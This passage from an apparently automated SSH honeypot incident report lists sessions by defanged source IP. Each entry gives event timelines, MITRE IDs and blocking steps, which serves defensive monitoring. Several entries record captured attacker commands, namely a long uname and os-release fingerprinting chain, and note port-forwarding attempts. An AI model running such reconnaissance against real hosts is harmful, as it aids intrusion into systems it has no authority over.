| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:54:12` | `cowrie.session.connect` |
| `2026-08-04 13:54:12` | `cowrie.client.version` |
| `2026-08-04 13:54:12` | `cowrie.client.kex` |
| `2026-08-04 13:54:15` | `cowrie.login.success` |
| `2026-08-04 13:54:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fba05e30b92

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 13:54 |
| **Last Seen** | 2026-08-04 13:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:54:12` | `cowrie.session.connect` |
| `2026-08-04 13:54:12` | `cowrie.client.version` |
| `2026-08-04 13:54:12` | `cowrie.client.kex` |
| `2026-08-04 13:54:13` | `cowrie.login.success` |
| `2026-08-04 13:54:13` | `cowrie.session.params` |
| `2026-08-04 13:54:13` | `cowrie.command.input` |
| `2026-08-04 13:54:13` | `cowrie.log.closed` |
| `2026-08-04 13:54:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc02d7222624

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-04 13:54 |
| **Last Seen** | 2026-08-04 13:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:54:13` | `cowrie.session.connect` |
| `2026-08-04 13:54:13` | `cowrie.client.version` |
| `2026-08-04 13:54:14` | `cowrie.client.kex` |
| `2026-08-04 13:54:14` | `cowrie.login.success` |
| `2026-08-04 13:54:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48e15bfee383

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-04 13:54 |
| **Last Seen** | 2026-08-04 13:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:54:16` | `cowrie.session.connect` |
| `2026-08-04 13:54:16` | `cowrie.client.version` |
| `2026-08-04 13:54:17` | `cowrie.client.kex` |
| `2026-08-04 13:54:17` | `cowrie.login.success` |
| `2026-08-04 13:54:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-712275fcf222

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-04 13:54 |
| **Last Seen** | 2026-08-04 13:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:54:17` | `cowrie.session.connect` |
| `2026-08-04 13:54:17` | `cowrie.client.version` |
| `2026-08-04 13:54:18` | `cowrie.client.kex` |
| `2026-08-04 13:54:18` | `cowrie.login.success` |
| `2026-08-04 13:54:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7f228e4ce63

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 13:55 |
| **Last Seen** | 2026-08-04 13:55 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:55:03` | `cowrie.session.connect` |
| `2026-08-04 13:55:04` | `cowrie.client.version` |
| `2026-08-04 13:55:04` | `cowrie.client.kex` |
| `2026-08-04 13:55:05` | `cowrie.login.success` |
| `2026-08-04 13:55:06` | `cowrie.session.params` |
| `2026-08-04 13:55:06` | `cowrie.command.input` |
| `2026-08-04 13:55:06` | `cowrie.command.input` |
| `2026-08-04 13:55:06` | `cowrie.command.input` |
| `2026-08-04 13:55:06` | `cowrie.command.input` |
| `2026-08-04 13:55:06` | `cowrie.command.input` |
| `2026-08-04 13:55:06` | `cowrie.command.success` |
| `2026-08-04 13:55:06` | `cowrie.command.input` |
| `2026-08-04 13:55:06` | `cowrie.command.input` |
| `2026-08-04 13:55:06` | `cowrie.command.input` |
| `2026-08-04 13:55:06` | `cowrie.command.input` |
| `2026-08-04 13:55:07` | `cowrie.log.closed` |
| `2026-08-04 13:55:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ed8e31bc16d

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 13:55 |
| **Last Seen** | 2026-08-04 13:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:55:48` | `cowrie.session.connect` |
| `2026-08-04 13:55:48` | `cowrie.client.version` |
| `2026-08-04 13:55:48` | `cowrie.client.kex` |
| `2026-08-04 13:55:49` | `cowrie.login.success` |
| `2026-08-04 13:55:49` | `cowrie.session.params` |
| `2026-08-04 13:55:49` | `cowrie.command.input` |
| `2026-08-04 13:55:50` | `cowrie.log.closed` |
| `2026-08-04 13:55:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43ce1c6d5dfa

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 13:56 |
| **Last Seen** | 2026-08-04 13:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:56:36` | `cowrie.session.connect` |
| `2026-08-04 13:56:36` | `cowrie.client.version` |
| `2026-08-04 13:56:36` | `cowrie.client.kex` |
| `2026-08-04 13:56:38` | `cowrie.login.success` |
| `2026-08-04 13:56:39` | `cowrie.session.params` |
| `2026-08-04 13:56:39` | `cowrie.command.input` |
| `2026-08-04 13:56:39` | `cowrie.command.input` |
| `2026-08-04 13:56:39` | `cowrie.command.input` |
| `2026-08-04 13:56:39` | `cowrie.command.input` |
| `2026-08-04 13:56:39` | `cowrie.command.input` |
| `2026-08-04 13:56:39` | `cowrie.command.success` |
| `2026-08-04 13:56:39` | `cowrie.command.input` |
| `2026-08-04 13:56:39` | `cowrie.command.input` |
| `2026-08-04 13:56:39` | `cowrie.command.input` |
| `2026-08-04 13:56:39` | `cowrie.command.input` |
| `2026-08-04 13:56:40` | `cowrie.log.closed` |
| `2026-08-04 13:56:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d47b8a00c450

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 13:57 |
| **Last Seen** | 2026-08-04 13:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:57:26` | `cowrie.session.connect` |
| `2026-08-04 13:57:26` | `cowrie.client.version` |
| `2026-08-04 13:57:26` | `cowrie.client.kex` |
| `2026-08-04 13:57:26` | `cowrie.login.success` |
| `2026-08-04 13:57:27` | `cowrie.session.params` |
| `2026-08-04 13:57:27` | `cowrie.command.input` |
| `2026-08-04 13:57:27` | `cowrie.log.closed` |
| `2026-08-04 13:57:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54d6dc70843d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 13:58 |
| **Last Seen** | 2026-08-04 13:58 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:58:02` | `cowrie.session.connect` |
| `2026-08-04 13:58:02` | `cowrie.client.version` |
| `2026-08-04 13:58:02` | `cowrie.client.kex` |
| `2026-08-04 13:58:04` | `cowrie.login.success` |
| `2026-08-04 13:58:06` | `cowrie.session.params` |
| `2026-08-04 13:58:06` | `cowrie.command.input` |
| `2026-08-04 13:58:06` | `cowrie.command.input` |
| `2026-08-04 13:58:06` | `cowrie.command.input` |
| `2026-08-04 13:58:06` | `cowrie.command.input` |
| `2026-08-04 13:58:06` | `cowrie.command.input` |
| `2026-08-04 13:58:06` | `cowrie.command.success` |
| `2026-08-04 13:58:06` | `cowrie.command.input` |
| `2026-08-04 13:58:06` | `cowrie.command.input` |
| `2026-08-04 13:58:06` | `cowrie.command.input` |
| `2026-08-04 13:58:06` | `cowrie.command.input` |
| `2026-08-04 13:58:07` | `cowrie.log.closed` |
| `2026-08-04 13:58:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75609123d072

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]192` |
| **First Seen** | 2026-08-04 13:58 |
| **Last Seen** | 2026-08-04 13:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:58:08` | `cowrie.session.connect` |
| `2026-08-04 13:58:08` | `cowrie.client.version` |
| `2026-08-04 13:58:08` | `cowrie.client.kex` |
| `2026-08-04 13:58:08` | `cowrie.login.success` |
| `2026-08-04 13:58:08` | `cowrie.direct-tcpip.request` |
| `2026-08-04 13:58:08` | `cowrie.direct-tcpip.data` |
| `2026-08-04 13:58:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]192` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]192` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5f2bd3d750b

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 13:59 |
| **Last Seen** | 2026-08-04 13:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:59:07` | `cowrie.session.connect` |
| `2026-08-04 13:59:07` | `cowrie.client.version` |
| `2026-08-04 13:59:07` | `cowrie.client.kex` |
| `2026-08-04 13:59:08` | `cowrie.login.success` |
| `2026-08-04 13:59:09` | `cowrie.session.params` |
| `2026-08-04 13:59:09` | `cowrie.command.input` |
| `2026-08-04 13:59:09` | `cowrie.log.closed` |
| `2026-08-04 13:59:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3325cf1f3f6a

| Field | Detail |
|---|---|
| **Source IP** | `102.220.160[.]42` |
| **First Seen** | 2026-08-04 13:59 |
| **Last Seen** | 2026-08-04 13:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:59:28` | `cowrie.session.connect` |
| `2026-08-04 13:59:28` | `cowrie.client.version` |
| `2026-08-04 13:59:28` | `cowrie.client.kex` |
| `2026-08-04 13:59:29` | `cowrie.login.success` |
| `2026-08-04 13:59:29` | `cowrie.direct-tcpip.request` |
| `2026-08-04 13:59:29` | `cowrie.direct-tcpip.data` |
| `2026-08-04 13:59:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.160[.]42` to AbuseIPDB if not already reported
- [ ] Block `102.220.160[.]42` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2beccc34105c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 13:59 |
| **Last Seen** | 2026-08-04 13:59 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:59:32` | `cowrie.session.connect` |
| `2026-08-04 13:59:32` | `cowrie.client.version` |
| `2026-08-04 13:59:32` | `cowrie.client.kex` |
| `2026-08-04 13:59:34` | `cowrie.login.success` |
| `2026-08-04 13:59:36` | `cowrie.session.params` |
| `2026-08-04 13:59:36` | `cowrie.command.input` |
| `2026-08-04 13:59:36` | `cowrie.command.input` |
| `2026-08-04 13:59:36` | `cowrie.command.input` |
| `2026-08-04 13:59:36` | `cowrie.command.input` |
| `2026-08-04 13:59:36` | `cowrie.command.input` |
| `2026-08-04 13:59:36` | `cowrie.command.success` |
| `2026-08-04 13:59:36` | `cowrie.command.input` |
| `2026-08-04 13:59:36` | `cowrie.command.input` |
| `2026-08-04 13:59:36` | `cowrie.command.input` |
| `2026-08-04 13:59:36` | `cowrie.command.input` |
| `2026-08-04 13:59:37` | `cowrie.log.closed` |
| `2026-08-04 13:59:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f5176e3a071

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-04 14:00 |
| **Last Seen** | 2026-08-04 14:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:00:01` | `cowrie.session.connect` |
| `2026-08-04 14:00:01` | `cowrie.client.version` |
| `2026-08-04 14:00:01` | `cowrie.client.kex` |
| `2026-08-04 14:00:02` | `cowrie.login.success` |
| `2026-08-04 14:00:02` | `cowrie.direct-tcpip.request` |
| `2026-08-04 14:00:02` | `cowrie.direct-tcpip.data` |
| `2026-08-04 14:00:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-febdf85a8424

| Field | Detail |
|---|---|
| **Source IP** | `60.18.139[.]82` |
| **First Seen** | 2026-08-04 14:00 |
| **Last Seen** | 2026-08-04 14:00 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:00:02` | `cowrie.session.connect` |
| `2026-08-04 14:00:02` | `cowrie.client.version` |
| `2026-08-04 14:00:02` | `cowrie.client.kex` |
| `2026-08-04 14:00:04` | `cowrie.login.success` |
| `2026-08-04 14:00:05` | `cowrie.direct-tcpip.request` |
| `2026-08-04 14:00:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.18.139[.]82` to AbuseIPDB if not already reported
- [ ] Block `60.18.139[.]82` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1a5cb1821a9

| Field | Detail |
|---|---|
| **Source IP** | `60.249.252[.]94` |
| **First Seen** | 2026-08-04 14:00 |
| **Last Seen** | 2026-08-04 14:00 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:00:11` | `cowrie.session.connect` |
| `2026-08-04 14:00:12` | `cowrie.client.version` |
| `2026-08-04 14:00:12` | `cowrie.client.kex` |
| `2026-08-04 14:00:14` | `cowrie.login.success` |
| `2026-08-04 14:00:15` | `cowrie.direct-tcpip.request` |
| `2026-08-04 14:00:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.249.252[.]94` to AbuseIPDB if not already reported
- [ ] Block `60.249.252[.]94` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d44af3c0216e

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 14:00 |
| **Last Seen** | 2026-08-04 14:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:00:48` | `cowrie.session.connect` |
| `2026-08-04 14:00:48` | `cowrie.client.version` |
| `2026-08-04 14:00:48` | `cowrie.client.kex` |
| `2026-08-04 14:00:49` | `cowrie.login.success` |
| `2026-08-04 14:00:49` | `cowrie.session.params` |
| `2026-08-04 14:00:49` | `cowrie.command.input` |
| `2026-08-04 14:00:50` | `cowrie.log.closed` |
| `2026-08-04 14:00:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ec0099852f1

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 14:01 |
| **Last Seen** | 2026-08-04 14:01 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:01:05` | `cowrie.session.connect` |
| `2026-08-04 14:01:05` | `cowrie.client.version` |
| `2026-08-04 14:01:05` | `cowrie.client.kex` |
| `2026-08-04 14:01:07` | `cowrie.login.success` |
| `2026-08-04 14:01:09` | `cowrie.session.params` |
| `2026-08-04 14:01:09` | `cowrie.command.input` |
| `2026-08-04 14:01:09` | `cowrie.command.input` |
| `2026-08-04 14:01:09` | `cowrie.command.input` |
| `2026-08-04 14:01:09` | `cowrie.command.input` |
| `2026-08-04 14:01:09` | `cowrie.command.input` |
| `2026-08-04 14:01:09` | `cowrie.command.success` |
| `2026-08-04 14:01:09` | `cowrie.command.input` |
| `2026-08-04 14:01:09` | `cowrie.command.input` |
| `2026-08-04 14:01:09` | `cowrie.command.input` |
| `2026-08-04 14:01:09` | `cowrie.command.input` |
| `2026-08-04 14:01:10` | `cowrie.log.closed` |
| `2026-08-04 14:01:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-478017d71822

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 14:02 |
| **Last Seen** | 2026-08-04 14:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:02:27` | `cowrie.session.connect` |
| `2026-08-04 14:02:27` | `cowrie.client.version` |
| `2026-08-04 14:02:27` | `cowrie.client.kex` |
| `2026-08-04 14:02:27` | `cowrie.login.success` |
| `2026-08-04 14:02:28` | `cowrie.session.params` |
| `2026-08-04 14:02:28` | `cowrie.command.input` |
| `2026-08-04 14:02:28` | `cowrie.log.closed` |
| `2026-08-04 14:02:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af1203b69715

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 14:02 |
| **Last Seen** | 2026-08-04 14:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
